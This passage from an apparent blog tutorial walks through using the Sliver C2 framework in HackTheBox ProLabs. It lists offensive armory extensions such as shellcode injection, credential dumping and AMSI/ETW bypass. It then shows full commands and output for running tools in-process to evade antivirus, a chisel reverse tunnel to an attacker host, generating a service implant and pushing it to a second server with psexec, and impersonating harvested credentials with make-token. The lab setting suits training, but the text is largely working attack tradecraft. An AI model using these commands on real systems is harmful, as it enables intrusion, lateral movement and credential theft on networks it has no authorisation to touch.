 Default   sharpchrome                     v0.0.4    Alias       adaptation of work from @gentilkiwi and @djhohnstein, specifically his SharpChrome project                                              
 Default   sharpdpapi                      v0.0.4    Alias       # port of some DPAPI functionality from @gentilkiwi's Mimikatz project                                                                  
 Default   sharpersist                     v0.0.2    Alias       Windows persistence toolkit                                                                                                             
 Default   sharplaps                       v0.0.1    Alias       Retrieve LAPS password from LDAP                                                                                                        
 Default   sharpmapexec                    v0.0.1    Alias       A sharpen version of CrackMapExec                                                                                                       
 Default   sharprdp                        v0.0.1    Alias       Remote Desktop Protocol .NET Console Application for Authenticated Command Execution                                                    
 Default   sharpsccm                       v2.0.12   Alias       A C# utility for interacting with SCCM                                                                                                  
 Default   sharpsecdump                    v0.0.1    Alias       C# port of impacket's secretsdump.py functionality                                                                                      
 Default   sharpsh                         v0.0.1    Alias       C# .Net Framework program that uses RunspaceFactory for Powershell command execution.                                                   
 Default   sharpup                         v0.0.2    Alias       C# port of various PowerUp functionality                                                                                                
 Default   sharpview                       v0.0.1    Alias       C# implementation of harmj0y's PowerView                                                                                                
 Default   sqlrecon                        v3.8.0    Alias       MS SQL toolkit designed for offensive reconnaissance and post-exploitation                                                              
 Default   syscalls_shinject               v0.0.1    Extension   Inject shellcode (either custom or beacon) into remote process using Syscalls                                                           
 Default   tgtdelegation                   v0.0.4    Extension   tgtdelegation: Obtain a usable Kerberos TGT                                                                                             
 Default   threadless-inject               v0.0.1    Extension   Execute shellcode within a remote process via hooking function calls.                                                                   
 Default   unhook-bof                      v0.0.2    Extension   Remove API hooks from a Beacon process.                                                                                                 
 Default   winrm                           v0.0.1    Extension   Execute commands remotely via WinRM                                                                                                     

 Bundles                                                                                                                                                  
 Armory Name   Name                    Contains                                                                                                           
============= ======================= ====================================================================================================================
 Default       .net-execute            sharp-smbexec, sharp-wmi, sharpmapexec, sharpersist, nopowershell, sharprdp                                        
                                       sharpsh, sharpsccm                                                                                                 
 Default       .net-pivot              krbrelayup, rubeus, certify, sharpsecdump, sharpchrome, sharpdpapi                                                 
                                       sqlrecon, sharplaps, mlokit                                                                                        
 Default       .net-recon              seatbelt, sharp-hound-3, sharpup, sharpview, sharp-hound-4                                                         
 Default       c2-tool-collection      c2tc-addmachineaccount, c2tc-askcreds, c2tc-domaininfo, c2tc-kerberoast, c2tc-kerbhash, c2tc-klist                 
                                       c2tc-lapsdump, c2tc-petitpotam, c2tc-psc, c2tc-psk, c2tc-psm                                                       
                                       c2tc-psw, c2tc-psx, c2tc-smbinfo, c2tc-spray-ad, c2tc-startwebclient                                               
                                       c2tc-wdtoggle, c2tc-winver                                                                                         
 Default       cs-remote-ops-bofs      remote-adcs-request, remote-adduser, remote-addusertogroup, remote-chrome-key, remote-enable-user, remote-lastpass 
                                       remote-office-tokens, remote-procdump, remote-process-destroy, remote-process-list-handles, remote-reg-delete      
                                       remote-reg-save, remote-reg-set, remote-sc-config, remote-sc-create, remote-sc-delete                              
                                       remote-sc-description, remote-sc-start, remote-sc-stop, remote-schtasks-delete, remote-schtasks-stop               
                                       remote-schtaskscreate, remote-schtasksrun, remote-setuserpass, remote-shspawnas, remote-suspendresume              
                                       remote-unexpireuser, remote-get_priv, remote-ghost_task, remote-sc_failure, remote-slack_cookie                    
                                       remote-adcs_request_on_behalf, remote-global_unprotect, remote-make_token_cert, remote-slackKey                    
 Default       kerberos                bof-roast, delegationbof, c2tc-kerberoast, tgtdelegation, kerbrute, nanorobeus                                     
                                                                                                                                                          
 Default       situational-awareness   sa-adcs-enum, sa-adcs-enum-com, sa-adcs-enum-com2, sa-adv-audit-policies, sa-arp, sa-cacls                         
                                       sa-driversigs, sa-enum-filter-driver, sa-enum-local-sessions, sa-find-loaded-module, sa-get-password-policy        
                                       sa-get-netsession, sa-ipconfig, sa-ldapsearch, sa-listdns, sa-listmods                                             
                                       sa-netgroup, sa-netlocalgroup, sa-netshares, sa-netstat, sa-netview                                                
                                       sa-nslookup, sa-reg-query, sa-routeprint, sa-sc-enum, sa-sc-qc                                                     
                                       sa-sc-qdescription, sa-sc-qfailure, sa-sc-qtriggerinfo, sa-sc-query, sa-schtasksenum                               
                                       sa-schtasksquery, sa-tasklist, sa-uptime, sa-vssenum, sa-whoami                                                    
                                       sa-windowlist, sa-wmi-query, sa-env, sa-get-netsession2, sa-list_firewall_rules                                    
                                       sa-locale, sa-netlocalgroup2, sa-netloggedon, sa-netloggedon2, sa-nettime                                          
                                       sa-netuptime, sa-ldapsearch, sa-notepad, sa-probe, sa-regsession                                                   
                                       sa-dir, sa-netuse, sa-netuser, sa-netuserenum                                                                      
 Default       windows-bypass          inject-etw-bypass, inject-amsi-bypass, unhook-bof, patchit                                                         
 Default       windows-credentials     nanodump, credman, chromiumkeydump, handlekatz, mimikatz, go-cookie-monster                                        
                                                                                                                                                          
 Default       windows-inject          hollow, secinject, syscalls_shinject, threadless-inject, inject-tooltip, inject-kernelcallbacktable                
                                       inject-uxsubclassinfo, inject-ntcreatethread, inject-dde, inject-ntqueueapcthread, inject-conhost                  
                                       inject-svcctrl, inject-ctray, inject-createremotethread, inject-setthreadcontext, inject-clipboard                 
                                                                                                                                                          
 Default       windows-pivot           scshell, bof-servicemove, winrm, jump-wmiexec, jump-psexec
```


We can install all BOF with the command armory install all.
A common enumeration tool is seatbelt which is part of armonry BOF. seatbelt syntax  is kinda finicky, to run it, one would enter the following command: seatbelt -- -group=all ; without those spaces in the command, the command will break :)

```bash
sliver (HIGH_RISER) > seatbelt -- -group=all

[*] seatbelt output:


<SNIP>                                                                           


====== AMSIProviders ======

  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
  ProviderPath                   : "C:\Program Files\Windows Defender\MpOav.dll"

====== AntiVirus ======

Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available on Windows Servers
====== AppLocker ======

  [*] AppIDSvc service is Running


    [*] Appx is in Enforce Mode
      [*] <FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

  [*] AppIDSvc service is Running
<SNIP>
```

NOW, the issue with BOF sometimes is that they will definately spawn a new process to execute, that will sets the alarms and kill your shell should there be an AV or some sort of security in place. Luckily just like execute-assembly, we can run a BOF in procress with the flag -i or to another existing process with -p. I guess we could also just do execute-assembly then add the -i as well, should work too. If nothing is changed in terms of what process to run into and inline ( -i) is not used, the child process that sliver will spawn will be a notepad process as set by default.

```bash
[server] sliver > seatbelt -h

⚠️  If you're having issues passing arguments to the alias please read:
https://github.com/BishopFox/sliver/wiki/Aliases-&-Extensions#aliases-command-parsing

Usage:
======
  seatbelt [flags] [arguments...]

Args:
=====
  arguments  string list    arguments (default: [])

Flags:
======
  -M, --amsi-bypass                 Bypass AMSI on Windows (only supported when used with --in-process)
  -d, --app-domain        string    AppDomain name to create for .NET assembly. Generated randomly if not set.
  -a, --arch              string    Assembly target architecture: x86, x64, x84 (x86+x64) (default: x84)
  -c, --class             string    Optional class name (required for .NET DLL)
  -E, --etw-bypass                  Bypass ETW on Windows (only supported when used with --in-process)
  -h, --help                        display help
  -i, --in-process                  Run in the current sliver process
  -m, --method            string    Optional method (a method is required for a .NET DLL)
  -P, --ppid              uint      parent process ID to use when creating the hosting process (Windows only) (default: 0)
  -p, --process           string    Path to process to host the shared object
  -A, --process-arguments string    arguments to pass to the hosting process
  -r, --runtime           string    Runtime to use for running the assembly (only supported when used with --in-process)
  -s, --save                        Save output to disk
  -t, --timeout           int       command timeout in seconds (default: 60)
```

As far as enumeration is concerned, feel free to check out other BOFs, from the armory list, especially looking at the bundles, situation-awareness and .net-recon.
One will that seems to be consitence is the syntax use of all BOFs, should the BOF exists outside of sliver, I recommend reading the documentation of that tool from origin, and apply the same syntax from the original documention to use it in sliver, you will soon find that the help menu and documentation on sliver does not tell you everything. just keep that in mind :)


# Pivoting

This is the part where... you know, most fail, it's not really that difficult, there's just less use-cases to expose people to practice that. 
The concept of pivoting remains the same, we just doing that with sliver now.

## Socks5
sliver does have something with aid with that, we get a built-in socks5 feature for any sessions, this is how we use it. Let's check out the help

```bash
[server] sliver > help socks5

In-band SOCKS5 Proxy

Usage:
======
  socks5 [flags]

Flags:
======
  -h, --help           display help
  -t, --timeout int    router timeout in seconds (default: 60)

Sub Commands:
=============
  start  Start an in-band SOCKS5 proxy
  stop   Stop a SOCKS5 proxy
```

So we can just enter from within a session, socks5 start and that's it. of course, do make sure that your proxychains4 are setup correctly.
To specify the port for the socks5, we can do : 

```bash
sliver (http-beacon) > socks5 start -P 1080

[*] Started SOCKS5 127.0.0.1 1080  
⚠️  In-band SOCKS proxies can be a little unstable depending on protocol
```

By default, sliver is run socks5 on port 1081, should you not specify the port. using the command above, your /etc/proxychains4.conf or /etc/pproxychains.conf file should be looking like the following at the very bottom of the file, at least the IP and port part of things

```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5 127.0.0.1 1080
```

Now by prefixing our command from our attacker machine with proxychains4, we should be able to execute the command against a target that only our first compromised (eg: SRV01) can see, which is not accessible to our attacker machine, that second machine is now with our range via proxy.

```bash
$ proxychains4 netexec smb 172.16.1.12 -u svc_sql -p 'ohmyohmy'
```

When it comes to protocols that have graphics, like running a RDP session from our attacker machine or VNC, it is recommended to use chisel instead as SOCKS5 as "⚠️  In-band SOCKS proxies can be a little unstable depending on protocol" if you noticed the warning while startin socks5.

I actually tried to rely on SOCKS5 for a VNC connection, and i only got a black screen :)

## Chisel
BOF can be very useful,for example, using chisel BOF, we do not need to upload a chisel client on the target, we could just run chisel as a client from the same session we got.

We can get chisel from armory like so, armory install chisel. let's check out the help on chisel

```bash
[server] sliver > chisel

[!] Please select a session or beacon via `use`

[server] sliver > help chisel

Usage:
'client': start chisel client in process
'server': start chisel server in process
'list': list running tasks in process
'stop': stop a task identified by taskId

Examples:
chisel client 1.2.3.4:80 R:socks
chisel server -p 8000 --socks5

Usage:
======
  chisel [flags] [arguments...]

Args:
=====
  arguments  string list    arguments (default: [])

Flags:
======
  -h, --help           display help
  -t, --timeout int    command timeout in seconds (default: 60)
```

On the attacker machine, we run the chisel server first.

```bash
$ chisel server --reverse -p 8000 -v --socks5
2023/10/27 09:07:29 server: Reverse tunnelling enabled
2023/10/27 09:07:29 server: Fingerprint 1+LEI/g3cXWqORdvVL2tHW9Y+d7A65F/tsbMrMBrGew=
2023/10/27 09:07:29 server: Listening on http://0.0.0.0:8000
```

After we enter a session first on sliver,we run chisel client like the example provided in the help menu.

```bash
sliver (http-beacon) > chisel client 10.10.14.62:8000 R:socks

[*] Successfully executed chisel
[*] Got output:
received argstring: client 10.10.14.62:8000 R:socks
os.Args = [chisel.exe client 10.10.14.62:8000 R:socks]
Task started successfully.
```
We get a successful connection on our server side, the proxy connectin has been established ,and can run command from our attacker machine like in SOCKS5

## Double Pivoting

In case of double pivoting,  where SRV02 cannot directly communicate to us, SRV02 will communicate to SRV01 from which the chain of communication will be established. So we can establish a connection using `pivots` utility which supports `tcp` pivot listener(s) and `named-pipe` listener(s),

The `tcp` pivot listener requires a `bind` address to be specified, which in our case is the IP address of SRV01 (internal); by default, every `tcp` pivot listener will listen on port `9898`.

We can then start a pivot listener.

```bash
sliver (http-beacon) > pivots tcp --bind <IPofSRV01>

[*] Started tcp pivot listener <IPofSRV01>:9898 with id 1
```

With the pivot listener started and in place, we need to proceed with creating an implant; the implant, as mentioned, must be in a service format

```bash
sliver (http-beacon) > generate --format service -i <IPofSRV01>:9898 --skip-symbols -N psexec-pivot

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[*] Implant saved to /home/maine/psexec-pivot.exe
```

From SRV02, Jumping into the psexec utility, we must specify the path of the implant's binary.

```bash
sliver (http-beacon) > psexec --custom-exe /home/maine/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeams srv02.mainesec.local

[*] Uploaded service binary to \\srv02.mainesec.local\C$\windows\temp\23grsdf.exe
[*] Waiting a bit for the file to be analyzed ...
[*] Successfully started service on srv02.mainesec.local (c:\windows\temp\23grsdf.exe)
[*] Successfully removed service Teams on srv02.mainesec.local
```

Now we have a session from our attacker machine to the SRV02. Note that Sliver (psexec) will generate a random file name, and by default, it will place it in C:\Windows\Temp, which can be monitored

# Lateral Movement

Of course, simply because the user Magareth does not belong to the Remote Desktop Group :) so after getting new credentials via deep enumeration, this is how we lateraly move using sliver C2.
To use other credentials, we need to create a new logon session using the technique make token (make-token in Sliver) to create a new token with the credentials we have harvested. Another technique involves the usage of runas, which facilitates the creation of a new process operating in the context of the specified credentials. This also can be done via a sacrificial process started with the help of Rubeus, let us see the help menu

```bash
[server] sliver > help make-token

Command: make-token -u USERNAME -d DOMAIN -p PASSWORD
About: Creates a new Logon Session from the specified credentials and impersonate the resulting token.
You can specify a custon Logon Type using the --logon-type flag, which defaults to LOGON32_LOGON_NEW_CREDENTIALS.
Valid types are:

LOGON_INTERACTIVE
LOGON_NETWORK
LOGON_BATCH
LOGON_SERVICE
LOGON_UNLOCK
LOGON_NETWORK_CLEARTEXT
LOGON_NEW_CREDENTIALS


Usage:
======
  make-token [flags]

Flags:
======
  -d, --domain     string    domain of the user to impersonate
  -h, --help                 display help
  -T, --logon-type string    logon type to use (default: LOGON_NEW_CREDENTIALS)
  -p, --password   string    password of the user to impersonate
  -t, --timeout    int       command timeout in seconds (default: 60)
  -u, --username   string    username of the user to impersonate
```

it is important to mention that calls like LogonUserA, and ImpersonateLoggedOnUser are made with syscalls :] meaning, alarms may go off.

```bash
sliver (http-beacon) > make-token -u svc_sql -d child.htb.local -p ohmyohmy

[*] Successfully impersonated child.htb.local\svc_sql. Use `rev2self` to revert to your previous token.
```

Our shell session is now authenticated with the new credentials, meaning different level of privileges/permissions over functionallity, folder/file permissions and so...

# Conclusion

There is plenty one can do with a C2 framework, we have covered the most important topic, Enumeration, Pivoting and Lateral movement via Sliver C2, topics such as kerberoasting and other techiniques, I deemed were out of scope, as skilled as you are, you will certainly find it straight-forward to implement your hacking techniques leveraging Sliver C2, be sure as well to go through the armory BOFs, that will certainly fast track your hacking progress.

I will be update this blog again as I progress through HackTheBox ProLabs, I believe I could have digged a little deeper overall on the explanations. nonetheless, do appreciate that I wrote all that without a a built-in grammar check, no AI, surely there are mistakes in here, but I'm impressed ! see you.
